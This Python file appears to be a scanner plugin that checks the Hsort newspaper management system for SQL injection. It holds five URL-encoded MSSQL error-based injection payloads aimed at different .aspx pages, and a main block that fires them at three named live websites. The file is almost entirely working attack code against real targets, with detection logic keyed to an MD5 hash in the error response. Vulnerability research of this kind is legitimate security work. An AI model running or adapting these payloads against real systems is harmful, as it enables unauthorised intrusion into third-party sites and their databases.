#!/usr/bin/evn python
#-*-:coding:utf-8 -*-

#Author:404
#Name:Hsort报刊管理系统getsql注入打包
#Refer:http://www.wooyun.org/bugs/wooyun-2015-0110055


def assign(service,arg):
    if service=="hsort":
        return True,arg 
    

def  audit(arg):
    ps = [
        "newsInfo.aspx?type=per&id=1&paperName=1&qnum=1&pagenum=(select+convert(int,sys.fn_varbintohexstr(hashbytes(%27MD5%27,%27a%27)))+FROM+syscolumns)--",
        "category.aspx?category=%27%2b+(select+convert(int,sys.fn_varbintohexstr(hashbytes(%27MD5%27,%27a%27)))+FROM+syscolumns)--",
        "transfor.aspx?paperName=%27%2b+(select+convert(int,sys.fn_varbintohexstr(hashbytes(%27MD5%27,%27a%27)))+FROM+syscolumns)--",
        "pagePiclist.aspx?paperName=1&qnum=(select+convert(int,sys.fn_varbintohexstr(hashbytes(%27MD5%27,%27a%27)))+FROM+syscolumns)&pagenum=1",
        "getReault.aspx?paperName=1&bdate=01/01/2011&edate=01/01/2011&news=%27)%20and%201=(select+convert(int,sys.fn_varbintohexstr(hashbytes(%27MD5%27,%27a%27)))+FROM+syscolumns)--",
        ]
    for p in ps:
        url=arg+p
        code, head, res, errcode, _ = curl.curl2(url)
        if code==500 and "cc175b9c0f1b6a831c399e269772661" in res:
            security_hole('SQL injection:'+url)
            
    
if __name__=="__main__":
    from dummy import *
    audit(assign('hsort','http://dzb.clynews.com/')[1])
    audit(assign('hsort','http://www.aheca.cn:8080/')[1])    
    audit(assign('hsort','http://www.hljjjb.com/')[1])